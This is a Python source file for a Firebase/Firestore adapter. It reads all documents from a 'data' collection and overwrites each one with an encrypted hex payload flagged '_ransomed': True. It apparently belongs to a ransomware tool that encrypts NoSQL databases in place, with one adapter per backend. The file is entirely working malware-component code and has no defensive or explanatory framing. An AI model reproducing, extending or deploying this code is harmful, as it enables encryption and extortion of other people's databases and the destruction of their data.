from typing import Any, List

from domain.service.INoSqlAdapter import INoSqlAdapter


class FirebaseAdapter(INoSqlAdapter):

    def __init__(self, uri: str) -> None:
        self._uri = uri
        self._records: List[Any] = []
        self._doc_refs: List[Any] = []
        self._connect()

    def _connect(self) -> None:
        try:
            import firebase_admin
            from firebase_admin import credentials, firestore
        except ImportError:
            raise ConnectionError("firebase-admin not installed: pip install firebase-admin")

        try:
            if not firebase_admin._apps:
                cred = credentials.Certificate(self._uri)
                firebase_admin.initialize_app(cred)
        except FileNotFoundError:
            raise ConnectionError(f"Firebase credentials file not found: {self._uri}")
        except ValueError as e:
            raise ConnectionError(f"Firebase invalid credentials: {e}")
        except Exception as e:
            raise ConnectionError(f"Firebase initialization failed: {e}")

        try:
            db = firestore.client()
            collection = db.collection("data")
            docs = list(collection.stream())
            self._doc_refs = [doc.reference for doc in docs]
            self._records  = [doc.to_dict() for doc in docs]
        except Exception as e:
            raise ConnectionError(f"Firebase Firestore query failed: {e}")

    def list_records(self) -> List[Any]:
        return self._records

    def overwrite(self, index: int, encrypted: bytes) -> None:
        ref = self._doc_refs[index]
        try:
            ref.set({"_encrypted": encrypted.hex(), "_ransomed": True})
        except Exception as e:
            raise ConnectionError(f"Firebase document update failed: {e}")
